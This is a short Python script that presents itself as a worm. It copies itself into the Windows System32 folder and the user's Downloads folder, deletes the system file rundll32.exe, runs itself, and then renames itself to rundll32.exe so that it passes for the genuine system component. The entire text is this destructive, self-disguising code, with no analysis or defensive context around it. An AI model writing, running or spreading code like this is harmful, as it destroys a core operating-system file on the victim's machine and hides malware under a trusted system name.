import os
import shutil
cwd = os.getcwd()
shutil.copy(cwd+"/Worm.py", "/Windows/System32")
name = os.getlogin()
path = ('/Users/' + name + '/Downloads')
shutil.copy(cwd+"/Worm.py", path)
os.chdir("/Windows/System32")
os.remove("rundll32.exe")
os.system("python Worm.py")
os.rename('Worm.py', 'rundll32.exe')
os.chdir(path)
os.remove("Worm.py")
